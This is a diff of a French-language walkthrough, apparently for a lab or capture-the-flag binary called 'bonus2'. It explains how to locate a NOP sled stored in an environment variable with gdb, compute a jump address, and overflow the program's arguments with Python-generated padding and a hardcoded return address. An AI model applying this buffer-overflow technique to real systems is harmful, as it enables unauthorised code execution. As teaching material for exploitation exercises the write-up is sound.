@@ -39,21 +39,21 @@ On localise l'adresse du sled:
 `(gdb)> x/4s *((char**)environ)`
 
 Commande a laquelle nous ajoutons +1 jusqu'a trouver l'adresse de la variable
-environ, puis nous cherchons l'adresse de la variable suivante.
+SLEDCODE, puis nous cherchons l'adresse de la variable suivante.
 
 Nous faisons ensuite la difference de ces deux adresses pour avoir la marge de
 notre sled, puis nous divison cette difference par deux pour aller au millieu,
 et enfin nous ajoutons le resultat de cette division a l'adresse de la variable
-SHELCODE pour diriger notre code au millieu de notre nopsled.
+SLEDCODE pour diriger notre code au millieu de notre nopsled.
 
 une fois cette addresse obtenue, nous la faisons passer dans le second argument
 de notre exploit: 
 
-`$ ./bonus2 $(python -c 'print [40 bytes de remplissage]') $(python -c 'print [18 bytes de remplissage] + [Adresse nopsled]')`
+`$ ~/bonus2 $(python -c 'print [40 bytes de remplissage]') $(python -c 'print [18 bytes de remplissage] + [Adresse nopsled]')`
 
-Soit:
+Soit par exemple:
 
 `$ ./bonus2 $(python -c 'print "A"*40') $(python -c 'print "i"*18 +
-"\x05\xf8\xff\xbf"')`
+"\x7d\xf8\xff\xbf"')`
 
 ![image](https://user-images.githubusercontent.com/29956389/90023240-ca544b00-dcb3-11ea-9769-3236d13ffefd.png)
